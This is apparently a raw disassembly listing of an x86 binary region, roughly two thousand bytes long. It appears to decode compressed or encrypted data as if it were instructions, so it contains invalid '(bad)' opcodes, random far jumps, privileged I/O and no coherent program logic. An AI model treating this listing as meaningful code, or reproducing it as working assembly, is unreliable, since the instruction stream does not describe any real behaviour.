  4263f4:	jmp    0x9584:0xfab649b3
  4263fb:	and    al,0x5a
  4263fd:	xor    BYTE PTR [edx+0x190dcef4],al
  426403:	inc    edi
  426404:	push   ds
  426405:	outs   dx,BYTE PTR ds:[esi]
  426406:	jnp    0x42644f
  426408:	lods   eax,DWORD PTR ds:[esi]
  426409:	xor    DWORD PTR [ebx+esi*4-0x5f],edi
  42640d:	stos   BYTE PTR es:[edi],al
  42640e:	xchg   ebp,eax
  42640f:	fsub   DWORD PTR [eax]
  426411:	mov    BYTE PTR [ecx+edi*1],al
  426414:	jbe    0x42643d
  426416:	pop    ds
  426417:	inc    eax
  426418:	stos   DWORD PTR es:[edi],eax
  426419:	xchg   BYTE PTR ds:0xb43ec1fd,dl
  42641f:	mov    dl,0x19
  426421:	jmp    0x4263c1
  426423:	xchg   ecx,eax
  426424:	jae    0x426411
  426426:	dec    ebx
  426427:	ins    DWORD PTR es:[edi],dx
  426428:	pshufw mm7,QWORD PTR [ebp+0x511568f6],0xff
  426430:	leave  
  426431:	push   ss
  426432:	adc    edx,DWORD PTR cs:[edx]
  426435:	sahf   
  426436:	dec    ebx
  426437:	imul   ebp,DWORD PTR ds:0xdfaebd52,0x7a
  42643e:	push   ebp
  42643f:	jbe    0x4263d8
  426441:	jne    0x4263c5
  426443:	push   edi
  426444:	cmc    
  426445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426446:	data16 ffree st(3)
  426449:	inc    esp
  42644a:	lds    ebp,FWORD PTR [ecx-0x65447bf1]
  426450:	push   ss
  426451:	call   ecx
  426453:	jge    0x42645a
  426455:	aaa    
  426456:	aas    
  426457:	subps  xmm2,XMMWORD PTR [ebx-0x78]
  42645b:	push   ebp
  42645c:	mov    ds:0xa27b4a0b,al
  426461:	aam    0x73
  426463:	pusha  
  426464:	jb     0x42648c
  426466:	ins    BYTE PTR es:[edi],dx
  426467:	inc    ecx
  426468:	out    dx,al
  426469:	mov    ecx,0x9712694b
  42646e:	jae    0x4264ca
  426470:	cmp    edx,edx
  426472:	dec    eax
  426473:	call   0xec6555a
  426478:	mov    eax,ds:0x9256e444
  42647d:	(bad)  
  42647e:	pop    edx
  42647f:	inc    edi
  426480:	pusha  
  426481:	aad    0xa5
  426483:	inc    ebx
  426484:	std    
  426485:	ss pop esi
  426487:	and    BYTE PTR [eax-0x15],dh
  42648a:	xor    BYTE PTR es:[edi-0x66],al
  42648e:	xor    BYTE PTR ds:0x4c03ee7a,ah
  426494:	mov    bh,0x3
  426496:	retf   0xf77c
  426499:	sub    ch,ah
  42649b:	call   0x4948e903
  4264a0:	shl    DWORD PTR [eax+0x59],1
  4264a3:	adc    eax,0x71679194
  4264a8:	jae    0x4264e0
  4264aa:	mov    ah,0xb4
  4264ac:	aas    
  4264ad:	(bad)  
  4264af:	add    BYTE PTR [eax+esi*4+0x68],bh
  4264b3:	dec    ebp
  4264b4:	(bad)  
  4264b6:	loopne 0x426523
  4264b8:	or     eax,0xa49bd26e
  4264bd:	dec    ecx
  4264be:	xor    BYTE PTR [edi+0x5dc3fff5],cl
  4264c4:	aad    0x28
  4264c6:	pop    ebp
  4264c7:	rcr    DWORD PTR [eax-0x4c],0xfd
  4264cb:	je     0x426452
  4264cd:	jg     0x426495
  4264cf:	imul   ebx,DWORD PTR [edi],0xc558282b
  4264d5:	out    dx,al
  4264d6:	mov    cl,0xc7
  4264d8:	ret    
  4264d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264da:	repnz lds esp,FWORD PTR [ebp+eax*8-0x40]
  4264df:	in     al,dx
  4264e0:	pop    ebx
  4264e1:	pop    ds
  4264e2:	jb     0x426516
  4264e4:	add    BYTE PTR [eax],al
  4264e6:	add    BYTE PTR [eax],al
  4264e8:	add    BYTE PTR [eax],al
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	sti    
  4264f7:	xchg   esi,eax
  4264f8:	(bad)  [edx]
  4264fa:	je     0x4264ee
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	add    BYTE PTR [esi],0x0
  426501:	add    BYTE PTR [esi+0x4f],al
  426504:	add    bh,0x7b
  426507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426508:	pop    ecx
  426509:	push   0x74ec54a4
  42650e:	imul   ebp,DWORD PTR ds:0x256b0c8c,0xffffffca
  426515:	bound  ebx,QWORD PTR [ebp-0x3f]
  426518:	not    edi
  42651a:	cmp    eax,0x5d0bf4f2
  42651f:	data16 ja 0x4264b2
  426522:	fstp   TBYTE PTR ss:[ebx]
  426525:	sub    al,0xc8
  426527:	cmp    dh,BYTE PTR [esi-0x209c3858]
  42652d:	mov    ah,0x5a
  42652f:	sbb    DWORD PTR [eax-0x48],eax
  426532:	sub    BYTE PTR ds:0x6732df8,bh
  426538:	packsswb mm6,QWORD PTR [edi+0x453003dd]
  42653f:	dec    esi
  426540:	or     edi,DWORD PTR [ecx-0x487910dc]
  426546:	mov    al,0xcf
  426548:	xor    dh,BYTE PTR [edx+0x12]
  42654b:	cli    
  42654c:	jnp    0x426558
  42654e:	and    eax,0x92f3dfd2
  426553:	dec    esp
  426554:	mov    ebx,0x677fadbf
  426559:	xlat   BYTE PTR ds:[ebx]
  42655a:	cmp    DWORD PTR [ebp+0x4fb1cb40],esp
  426560:	repnz dec ebx
  426562:	jge    0x4265c1
  426564:	(bad)  
  426565:	js     0x42659b
  426567:	inc    edx
  426568:	sub    DWORD PTR [ebx-0x70],0xffffffab
  42656c:	shl    DWORD PTR [ebp-0x63],cl
  42656f:	xchg   DWORD PTR [esi-0x32af424b],esp
  426575:	pop    ebp
  426576:	call   0xa9fd:0x61167642
  42657d:	dec    BYTE PTR [edx]
  42657f:	xor    ebx,DWORD PTR [edx]
  426581:	lock imul DWORD PTR [esi-0x5698bb13]
  426588:	xchg   DWORD PTR [ebx-0x25],eax
  42658b:	jo     0x4265e9
  42658d:	fdivr  st,st(4)
  42658f:	cdq    
  426590:	nop
  426591:	pusha  
  426592:	pop    ecx
  426593:	aaa    
  426594:	fist   DWORD PTR [ecx-0x40dd9f]
  42659a:	shl    BYTE PTR [ebx],cl
  42659c:	cld    
  42659d:	ds push ecx
  42659f:	popf   
  4265a0:	loope  0x42661d
  4265a2:	jo     0x42655f
  4265a4:	add    al,0xda
  4265a6:	mov    si,0x9adf
  4265aa:	and    eax,0x8724c95d
  4265af:	mov    ebp,0x63c05816
  4265b4:	pop    es
  4265b5:	fmul   QWORD PTR [edx+eax*1-0x7bf55b25]
  4265bc:	dec    ebx
  4265bd:	mov    WORD PTR [edi-0x75],?
  4265c0:	rol    DWORD PTR [edx+ecx*1],0x7e
  4265c4:	xchg   esp,eax
  4265c5:	xor    al,BYTE PTR [ebx+0x1e]
  4265c8:	inc    edi
  4265c9:	es push ds
  4265cb:	xchg   ebp,eax
  4265cc:	xor    ah,BYTE PTR [ebx-0x75]
  4265cf:	std    
  4265d0:	push   esp
  4265d1:	es sub dl,dh
  4265d4:	gs mov cl,0xaf
  4265d7:	dec    esi
  4265d8:	adc    DWORD PTR [ecx+0x2b],0xffffffef
  4265dc:	xor    DWORD PTR [eax+eax*1-0x1b893f9c],ecx
  4265e3:	int3   
  4265e4:	(bad)  
  4265e5:	push   ss
  4265e6:	test   BYTE PTR [ebx+0x4a],al
  4265e9:	xor    al,0x22
  4265eb:	sahf   
  4265ec:	fwait
  4265ed:	dec    edx
  4265ee:	cmp    edx,DWORD PTR [esi-0x41]
  4265f1:	add    ch,BYTE PTR [edi]
  4265f3:	sbb    bh,ch
  4265f5:	outs   dx,BYTE PTR ds:[esi]
  4265f6:	push   esp
  4265f7:	icebp  
  4265f8:	ja     0x426662
  4265fa:	push   edi
  4265fb:	mov    ecx,0x9d1f9122
  426600:	jae    0x42658c
  426602:	or     eax,0x768ba60a
  426607:	inc    esi
  426608:	mov    ch,0x22
  42660a:	cdq    
  42660b:	sar    DWORD PTR [ebp+edi*1+0x4fe675d5],cl
  426612:	mov    edx,0x3f7fa446
  426617:	and    BYTE PTR [ebp+0x371e17f2],bh
  42661d:	mov    BYTE PTR [esi+0x1e],ah
  426620:	out    0x6e,al
  426622:	ds cld 
  426624:	pushf  
  426625:	cwde   
  426626:	and    eax,0x264bda61
  42662b:	or     BYTE PTR [edi+0x37b64c36],0xd
  426632:	push   ecx
  426633:	pop    ebp
  426634:	xor    BYTE PTR [edi+0x5d],ah
  426637:	mov    esp,0x10812d13
  42663c:	gs out 0xcf,al
  42663f:	stos   DWORD PTR es:[edi],eax
  426640:	and    edx,DWORD PTR [edx]
  426642:	mov    eax,0x7ffe88e5
  426647:	cmp    BYTE PTR es:[esi+0x34],bl
  42664b:	xchg   esp,eax
  42664c:	les    ebp,FWORD PTR [ebp-0x56]
  42664f:	cmp    dh,BYTE PTR [eax]
  426651:	push   ds
  426652:	ds lock hlt 
  426655:	lods   eax,DWORD PTR ds:[esi]
  426656:	mov    bl,0x8f
  426658:	cs push ds
  42665a:	inc    ecx
  42665b:	xchg   edx,eax
  42665c:	mov    ebx,0xdcad3099
  426661:	xor    eax,0xc6c35428
  426666:	loopne 0x4266d8
  426668:	push   ss
  426669:	jecxz  0x42665d
  42666b:	sub    BYTE PTR [edi+0x77],0xc7
  42666f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426670:	stos   BYTE PTR es:[edi],al
  426671:	shr    DWORD PTR [esp+ecx*2-0x73f34e47],cl
  426678:	fist   DWORD PTR [eax+0x59]
  42667b:	inc    eax
  42667c:	xor    eax,0x9aa3ae48
  426681:	in     eax,dx
  426682:	scas   al,BYTE PTR es:[edi]
  426683:	hlt    
  426684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426685:	inc    esp
  426686:	pop    esp
  426687:	sub    bl,dl
  426689:	fstp   QWORD PTR [eax-0x65ad556f]
  42668f:	pop    edx
  426690:	jnp    0x426632
  426692:	jmp    0x36ed:0x6e6ed233
  426699:	iret   
  42669a:	or     cl,BYTE PTR [esi-0x118f447f]
  4266a0:	in     al,0xa8
  4266a2:	mov    WORD PTR [ebx-0x242e4d20],?
  4266a8:	sti    
  4266a9:	imul   eax,edx,0x1e2fef8c
  4266af:	xor    DWORD PTR ds:0x553754d5,ebp
  4266b5:	es sub eax,0xe580cda7
  4266bb:	je     0x42668b
  4266bd:	sbb    BYTE PTR [ecx],bh
  4266bf:	popa   
  4266c0:	push   cs
  4266c1:	cmp    esi,DWORD PTR [ebp-0x48]
  4266c4:	or     al,0x29
  4266c6:	sahf   
  4266c7:	out    0x4c,eax
  4266c9:	dec    esi
  4266ca:	xchg   edi,eax
  4266cb:	sub    al,0x60
  4266cd:	fs mov ch,0xe5
  4266d0:	or     ch,ah
  4266d2:	dec    esp
  4266d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266d5:	sub    esi,esi
  4266d7:	push   ecx
  4266d8:	dec    ebp
  4266d9:	xor    edx,esi
  4266db:	aaa    
  4266dc:	es push ss
  4266de:	xchg   ecx,eax
  4266df:	and    al,0x11
  4266e1:	std    
  4266e2:	pop    edi
  4266e3:	adc    al,0x19
  4266e5:	fld    DWORD PTR [ebx*1-0x28852484]
  4266ec:	test   al,0x51
  4266ee:	aam    0xae
  4266f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f1:	jp     0x426764
  4266f3:	cmp    al,0x54
  4266f5:	cli    
  4266f6:	stos   DWORD PTR es:[edi],eax
  4266f7:	push   ecx
  4266f8:	xchg   dl,dh
  4266fa:	dec    ebx
  4266fb:	dec    eax
  4266fd:	mov    fs,WORD PTR ss:[esi+0x56ddbc85]
  426704:	jp     0x426719
  426706:	adc    al,0xcd
  426708:	lds    ebx,FWORD PTR [edx+ebx*2-0x7d35ff0c]
  42670f:	or     dh,BYTE PTR [ebp+0x1936f78b]
  426715:	or     DWORD PTR [eax+0x38],esi
  426718:	shl    BYTE PTR [ecx-0x2def21c9],cl
  42671e:	xchg   edi,eax
  42671f:	xor    DWORD PTR [esi+0x2cc7be42],esp
  426725:	inc    esp
  426726:	mov    WORD PTR [ebx+0x481920cd],es
  42672c:	and    dl,BYTE PTR ds:0xe4417494
  426732:	dec    BYTE PTR [edx+0x3b099eae]
  426738:	mov    BYTE PTR [esp+ebx*8],0xee
  42673c:	pop    edi
  42673d:	aad    0x17
  42673f:	int3   
  426740:	jmp    0x426750
  426742:	or     cl,BYTE PTR [esi-0x43a93818]
  426748:	cwde   
  426749:	fpatan 
  42674b:	jae    0x426744
  42674d:	lods   al,BYTE PTR ds:[esi]
  42674e:	mov    ch,0x2a
  426750:	adc    BYTE PTR [edx+ebp*8+0x2b],0x26
  426755:	pop    ds
  426756:	lods   al,BYTE PTR ds:[esi]
  426757:	cwde   
  426758:	xor    BYTE PTR [ebx+0x1f],bh
  42675b:	aaa    
  42675c:	jg     0x426790
  42675e:	mov    gs,WORD PTR [edx-0x7bd6f06f]
  426764:	imul   ebx,DWORD PTR [edx+0x21a729d4],0x14
  42676b:	mov    eax,ds:0xaa54141c
  426770:	jle    0x42671c
  426772:	push   ss
  426773:	adc    ebx,DWORD PTR [edx+0x62]
  426776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426777:	pop    esp
  426778:	pop    es
  426779:	sbb    BYTE PTR [eax+eax*4-0xed8ae0e],cl
  426780:	mov    al,ds:0x13d69a
  426785:	adc    BYTE PTR [edx],cl
  426787:	(bad)
  42678d:	inc    esp
  42678e:	jmp    ebx
  426790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426791:	ficom  DWORD PTR [ecx]
  426793:	mov    dh,0xfb
  426795:	jns    0x426793
  426797:	push   ss
  426798:	mov    al,0x98
  42679a:	adc    DWORD PTR [eax+0x73],edx
  42679d:	mov    ecx,0xd7db4a93
  4267a2:	shl    bh,0xa5
  4267a5:	out    dx,al
  4267a6:	inc    si
  4267a8:	mulps  xmm5,xmm0
  4267ab:	fs jecxz 0x426765
  4267ae:	pop    ds
  4267af:	sbb    DWORD PTR [eiz*1+0x6ee7185a],0x8c73f8ca
  4267ba:	outs   dx,BYTE PTR ds:[esi]
  4267bb:	daa    
  4267bc:	retf   
  4267bd:	call   0xee249b4
  4267c2:	jmp    0x426779
  4267c4:	and    BYTE PTR [edx+0x230fb569],ah
  4267ca:	or     BYTE PTR [ebx],0x2e
  4267cd:	fs pop esp
  4267cf:	sub    DWORD PTR [ecx+0x45],ebx
  4267d2:	push   edi
  4267d3:	outs   dx,DWORD PTR ds:[esi]
  4267d4:	xchg   esp,eax
  4267d5:	dec    esp
  4267d6:	repnz adc DWORD PTR cs:[edi-0x23],ebp
  4267db:	xor    dh,BYTE PTR [esi+0x45]
  4267de:	mov    eax,0x55b1db3c
  4267e3:	(bad)  
  4267e4:	jno    0x426853
  4267e6:	adc    DWORD PTR [esi+0x778e3bfe],eax
  4267ec:	scas   al,BYTE PTR es:[edi]
  4267ed:	fnstsw WORD PTR [ecx]
  4267ef:	jg     0x4267cf
  4267f1:	sub    ecx,ecx
  4267f3:	call   0xe168:0xec43dc13
  4267fa:	cmp    ebp,esi
  4267fc:	lahf   
  4267fd:	and    eax,0xc45b910c
  426802:	dec    edx
  426803:	push   ds
  426804:	inc    eax
  426805:	es shl eax,cl
  426808:	adc    bh,dh
  42680a:	push   edi
  42680b:	enter  0x306d,0xa1
  42680f:	ficom  DWORD PTR [edi-0x7f5caefe]
  426815:	mov    bl,0xd6
  426817:	ins    BYTE PTR es:[edi],dx
  426818:	mov    ss,WORD PTR [ebx+eax*8-0x71c7f8c5]
  42681f:	outs   dx,BYTE PTR ds:[esi]
  426820:	daa    
  426821:	loop   0x426895
  426823:	sub    dh,BYTE PTR gs:[ecx-0x50]
  426827:	mov    dl,0xc1
  426829:	popf   
  42682a:	call   0xbe30:0x8a6df76f
  426831:	hlt    
  426832:	sbb    al,0x7c
  426834:	(bad)  
  426835:	(bad)  
  426836:	mov    edx,0xc8948e2b
  42683b:	ja     0x42684e
  42683d:	(bad)  
  42683e:	popa   
  42683f:	je     0x426828
  426841:	daa    
  426842:	pop    esi
  426843:	lods   eax,DWORD PTR ds:[esi]
  426844:	and    eax,0xb06c89a0
  426849:	jae    0x4267d2
  42684b:	mov    bh,0xa8
  42684d:	mov    cl,ah
  42684f:	or     dh,dl
  426851:	test   eax,0xa403b0cc
  426856:	mov    bl,0xe0
  426858:	add    esi,DWORD PTR [ebp-0x1b]
  42685b:	xchg   edx,eax
  42685c:	outs   dx,BYTE PTR ds:[esi]
  42685d:	aam    0xac
  42685f:	mov    edx,ebx
  426861:	in     eax,dx
  426862:	jmp    0xbc1ac37c
  426867:	push   ss
  426868:	loopne 0x426846
  42686a:	jge    0x4268d3
  42686c:	dec    esi
  42686d:	push   cs
  42686e:	dec    esp
  42686f:	mul    cl
  426871:	addr16 inc edi
  426873:	mov    esp,0x402744a4
  426878:	xchg   esi,eax
  426879:	adc    DWORD PTR [edi+0x1e834e8a],edx
  42687f:	sub    eax,0xfa8f113f
  426884:	mov    edx,DWORD PTR [edi+0x4bffa60f]
  42688a:	dec    esi
  42688b:	js     0x426899
  42688d:	sti    
  42688e:	xlat   BYTE PTR ds:[ebx]
  42688f:	ret    0x88b
  426892:	mov    al,0xa9
  426894:	pop    ds
  426895:	mov    ebp,0xbf55cded
  42689a:	out    dx,al
  42689b:	test   BYTE PTR [ebx+0x6],0x0
  42689f:	test   al,0xb6
  4268a1:	addr16 jle 0x426894
  4268a4:	xor    DWORD PTR ds:[eax],ecx
  4268a7:	daa    
  4268a8:	arpl   WORD PTR [eax-0x1395aab1],bp
  4268ae:	ss push ds
  4268b0:	sub    dl,cl
  4268b2:	jle    0x4268f0
  4268b4:	adc    BYTE PTR [edx-0x48fbcfb5],bh
  4268ba:	std    
  4268bb:	es test al,0xdc
  4268be:	aam    0xb4
  4268c0:	nop
  4268c1:	sar    BYTE PTR ds:0x528efa5,1
  4268c7:	mov    edx,0x68cb753f
  4268cc:	cmp    bh,BYTE PTR [eax]
  4268ce:	mov    esp,0x75ad621f
  4268d3:	xchg   edi,eax
  4268d4:	sbb    cl,BYTE PTR [edx]
  4268d6:	clc    
  4268d7:	add    al,0xd
  4268d9:	or     al,0x80
  4268db:	loopne 0x4268e7
  4268dd:	retf   
  4268de:	xchg   dl,ch
  4268e0:	add    esp,DWORD PTR [edx]
  4268e2:	fcomip st,st(3)
  4268e4:	push   0x50656896
  4268e9:	out    dx,eax
  4268ea:	cmp    ecx,DWORD PTR [edx-0x2d52ee46]
  4268f0:	mov    ah,BYTE PTR [eax+0x59592fe8]
  4268f6:	jl     0x426937
  4268f8:	mov    ecx,DWORD PTR [edi-0x71fdf3be]
  4268fe:	pop    edi
  4268ff:	and    bh,dh
  426901:	or     DWORD PTR [edi],0xffffff8c
  426904:	hlt    
  426905:	imul   eax,DWORD PTR [ecx-0x607b60e7],0xffffffa8
  42690c:	mov    BYTE PTR [edi+0x2dfddc4f],dl
  426912:	sbb    DWORD PTR [ebp-0x65],ebx
  426915:	iret   
  426916:	mov    dh,0x65
  426918:	das    
  426919:	xchg   ecx,eax
  42691a:	adc    DWORD PTR [eax-0x393bece7],ebx
  426920:	or     BYTE PTR [ecx-0x20],cl
  426923:	xchg   edi,eax
  426924:	aam    0x8
  426926:	sub    BYTE PTR [edi+0x32e1cc33],al
  42692c:	mov    ch,0x81
  42692e:	test   BYTE PTR [ecx],0x14
  426931:	add    ebx,DWORD PTR [esi+eax*4+0x21395681]
  426938:	push   esi
  426939:	lea    esi,[esi+0x5d29729a]
  42693f:	push   0x8289e7b0
  426944:	push   ebx
  426945:	clc    
  426946:	shr    DWORD PTR [esi],cl
  426948:	sbb    al,0xfa
  42694a:	ret    0x88b8
  42694d:	in     eax,dx
  42694e:	jb     0x426948
  426950:	or     DWORD PTR [edi+0x1078b3a1],esp
  426956:	add    al,0xb
  426958:	fnclex 
  42695a:	push   edi
  42695b:	fcmovu st,st(0)
  42695d:	or     esi,DWORD PTR [edi]
  42695f:	(bad)  
  426960:	ror    DWORD PTR [ecx],cl
  426962:	mov    ds:0xa0e1a41a,eax
  426967:	or     al,0x58
  426969:	test   al,0xb3
  42696b:	mov    esi,0xdeb21477
  426970:	pop    esi
  426971:	push   es
  426972:	popa   
  426973:	dec    eax
  426974:	mov    cl,dh
  426976:	dec    eax
  426977:	sbb    al,BYTE PTR [ebx-0x7d]
  42697a:	in     eax,0xd9
  42697c:	test   DWORD PTR [ecx+0x221dd5fd],ebp
  426982:	pop    esi
  426983:	cwde   
  426984:	mov    ds:0xbe3e9969,eax
  426989:	add    cl,bl
  42698b:	mov    edi,0x5a2f4129
  426990:	call   0xd2f8f0db
  426995:	lods   eax,DWORD PTR ds:[esi]
  426996:	add    eax,0x531b0a2
  42699b:	push   cs
  42699c:	aam    0xff
  42699e:	clc    
  42699f:	xor    BYTE PTR [eax+0x65],0x35
  4269a3:	jbe    0x426967
  4269a5:	mov    DWORD PTR [edi],0x9609e9d0
  4269ab:	mov    eax,ds:0x22ba0d02
  4269b0:	add    BYTE PTR [edi-0x32],ch
  4269b3:	cmp    ch,BYTE PTR [esi]
  4269b5:	dec    ecx
  4269b6:	scas   eax,DWORD PTR es:[edi]
  4269b7:	and    al,BYTE PTR [edx]
  4269b9:	push   edi
  4269ba:	std    
  4269bb:	daa    
  4269bc:	push   ebp
  4269bd:	sbb    bh,BYTE PTR [eax-0x3b]
  4269c0:	loop   0x4269ce
  4269c2:	sub    al,0x0
  4269c4:	sub    al,0x33
  4269c6:	std    
  4269c7:	or     dl,bl
  4269c9:	xchg   ecx,eax
  4269ca:	jl     0x4269ea
  4269cc:	add    DWORD PTR [edi],0x45b7cedd
  4269d2:	pop    edi
  4269d3:	out    dx,al
  4269d4:	sub    DWORD PTR [eax],esi
  4269d6:	add    dh,0xe3
  4269d9:	mov    al,BYTE PTR [ebx-0x7d]
  4269dc:	(bad)
  4269df:	fstp   DWORD PTR [ebx+edx*1]
  4269e2:	add    DWORD PTR [ecx-0x2a],edx
  4269e5:	in     al,0xc7
  4269e7:	cli    
  4269e8:	add    ah,BYTE PTR [ecx+eax*8-0x5f159703]
  4269ef:	icebp  
  4269f0:	pop    ebp
  4269f1:	jb     0x426a08
  4269f3:	cmp    DWORD PTR [esi-0x7a1d255a],ebp
  4269f9:	in     al,dx
  4269fa:	jge    0x4269c8
  4269fc:	jle    0x4269cc
  4269fe:	sbb    dl,dh
  426a00:	repnz push esp
  426a02:	int3   
  426a03:	inc    esi
  426a04:	hlt    
  426a05:	push   edx
  426a06:	mov    DWORD PTR [eax-0x6617cb66],0xe568438a
  426a10:	xor    al,BYTE PTR [ecx-0x75]
  426a13:	icebp  
  426a14:	idiv   BYTE PTR [esi+0x1a]
  426a17:	pop    ebx
  426a18:	out    dx,al
  426a19:	pop    edi
  426a1a:	xlat   BYTE PTR ds:[ebx]
  426a1b:	jo     0x426a0d
  426a1d:	pop    edx
  426a1e:	popf   
  426a1f:	lock sub al,0x96
  426a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a23:	std    
  426a24:	xchg   ebp,eax
  426a25:	sti    
  426a26:	xor    al,dh
  426a28:	pop    edx
  426a29:	leave  
  426a2a:	clc    
  426a2b:	or     dh,BYTE PTR [ebp+0x4c7157c9]
  426a31:	push   0x6
  426a33:	sbb    al,0x10
  426a35:	fdiv   DWORD PTR [ebx+0x4f3d660b]
  426a3b:	mov    ch,0xab
  426a3d:	js     0x426a7c
  426a3f:	shl    bl,0x3f
  426a42:	push   esp
  426a43:	cmp    DWORD PTR [eax],ebp
  426a45:	sbb    bl,BYTE PTR [ecx]
  426a47:	push   ecx
  426a48:	(bad)  
  426a49:	xchg   ebp,eax
  426a4a:	ins    DWORD PTR es:[edi],dx
  426a4b:	cmp    al,BYTE PTR [edx]
  426a4d:	pop    edx
  426a4e:	int3   
  426a4f:	xor    BYTE PTR [edi+edi*1+0x3e],bh
  426a53:	cmp    BYTE PTR [edx],al
  426a55:	adc    al,0x6c
  426a57:	les    edi,FWORD PTR [ecx+0x60]
  426a5a:	mov    esp,0xc3e61de2
  426a5f:	adc    ebx,DWORD PTR [eax+0xdd21e79]
  426a65:	leave  
  426a66:	outs   dx,DWORD PTR ds:[esi]
  426a67:	add    dl,BYTE PTR [esi]
  426a69:	add    al,0xbe
  426a6b:	cwde   
  426a6c:	out    dx,al
  426a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a6e:	xor    eax,0x35f2111e
  426a73:	daa    
  426a74:	ja     0x426a20
  426a76:	push   0x3
  426a78:	cmc    
  426a79:	fisub  DWORD PTR gs:[esi]
  426a7c:	jp     0x426ad9
  426a7e:	inc    esi
  426a7f:	adc    eax,esi
  426a81:	push   esi
  426a82:	adc    DWORD PTR [ecx-0x5f3655b8],ebx
  426a88:	loopne 0x426a8e
  426a8a:	retf   0x5d5f
  426a8d:	adc    ebx,DWORD PTR ds:0xc4dca901
  426a93:	int3   
  426a94:	xchg   edi,eax
  426a95:	inc    ebx
  426a96:	pop    esi
  426a97:	xor    eax,0x5c14a630
  426a9c:	aas    
  426a9d:	push   ss
  426a9e:	xchg   esi,eax
  426a9f:	inc    esi
  426aa0:	cwde   
  426aa1:	in     eax,dx
  426aa2:	data16 loop 0x426ac4
  426aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426aa6:	cli    
  426aa7:	sar    ebx,1
  426aa9:	in     al,0xb7
  426aab:	mov    cl,0x4
  426aad:	xchg   BYTE PTR [edi+0x5ba3fb4a],dh
  426ab3:	clc    
  426ab4:	dec    edx
  426ab5:	ins    DWORD PTR es:[edi],dx
  426ab6:	sti    
  426ab7:	cmp    esp,0x2bf5f84d
  426abd:	test   al,0x6
  426abf:	sbb    edx,DWORD PTR [edi+ebx*2+0x6dc5f32]
  426ac6:	mov    ebx,0x52908b8f
  426acb:	ds push 0xe4436e2d
  426ad1:	mov    eax,0x86e0ff42
  426ad6:	jae    0x426acd
  426ad8:	xchg   ebx,eax
  426ad9:	cmp    bl,BYTE PTR ds:0x7c446218
  426adf:	dec    edi
  426ae0:	(bad)  
  426ae1:	loopne 0x426ac8
  426ae3:	std    
  426ae4:	cmp    al,al
  426ae6:	je     0x426a79
  426ae8:	inc    ebx
  426ae9:	outs   dx,BYTE PTR ds:[esi]
  426aea:	pop    ds
  426aeb:	bound  eax,QWORD PTR [esi+0x7373907c]
  426af1:	xor    BYTE PTR [ebx+0x214ea1e0],dl
  426af7:	cmp    bl,BYTE PTR ds:0xad9c7011
  426afd:	add    DWORD PTR [ecx-0x23eef092],ecx
  426b03:	test   eax,0x1fe34450
  426b08:	mov    cl,0x3c
  426b0a:	pop    es
  426b0b:	ins    BYTE PTR es:[edi],dx
  426b0c:	adc    eax,0xd10913c
  426b11:	aam    0x13
  426b13:	jl     0x426ae5
  426b15:	pop    edx
  426b16:	push   edx
  426b17:	push   edi
  426b18:	into   
  426b19:	leave  
  426b1a:	mov    ebx,0x2753b04
  426b1f:	popa   
  426b20:	or     DWORD PTR [ecx+ebx*4+0x10],eax
  426b24:	imul   edx,DWORD PTR [edx+0x67],0x9cc08401
  426b2b:	ret    0x148
  426b2e:	inc    BYTE PTR [ecx+0x65]
  426b31:	jbe    0x426b03
  426b33:	mov    DWORD PTR ds:0xeec7b1f9,ebp
  426b39:	mov    al,ds:0xe950b1eb
  426b3e:	nop
  426b3f:	jge    0x426aec
  426b41:	int    0x6c
  426b43:	gs das 
  426b45:	jmp    0x981d3ce0
  426b4a:	cmc    
  426b4b:	cs mov ah,0x24
  426b4e:	int    0x15
  426b50:	cs push esi
  426b52:	jb     0x426b61
  426b54:	and    eax,0x4b4102d1
  426b59:	imul   DWORD PTR [ecx-0x42a47967]
  426b5f:	inc    esi
  426b60:	stos   BYTE PTR es:[edi],al
  426b61:	fsub   st(3),st
  426b63:	push   edi
  426b64:	aad    0x52
  426b66:	hlt    
  426b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b68:	bound  esp,QWORD PTR [edi+0xb]
  426b6b:	retf   0x9b85
  426b6e:	cmp    ecx,ebp
  426b70:	pusha  
  426b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b72:	pusha  
  426b73:	mov    edx,0xeb9a1ba9
  426b78:	icebp  
  426b79:	or     BYTE PTR [ebp+eax*1-0x72a9bed],bl
  426b80:	jg     0x426b4f
  426b82:	sub    al,0x51
  426b84:	add    BYTE PTR [eax],al
  426b86:	add    BYTE PTR [eax],al
  426b88:	add    BYTE PTR [eax],al
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0x3981,0x6a
  426b98:	adc    eax,0x1f8f672
  426b9d:	add    BYTE PTR [esi+0x6],bh
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	sub    eax,0xe73275bd
  426ba7:	and    BYTE PTR [ebx+ebp*8-0x501ac55f],0xe0
  426baf:	mov    eax,ds:0x51d1d0b3
  426bb4:	stc    
  426bb5:	jmp    0x6ce9b60d
  426bba:	inc    edi
  426bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bbc:	in     al,0xe5
  426bbe:	add    edi,DWORD PTR [edx+0x54f30d3c]
  426bc4:	stc    
  426bc5:	call   0x8c38f2cd
  426bca:	pusha  
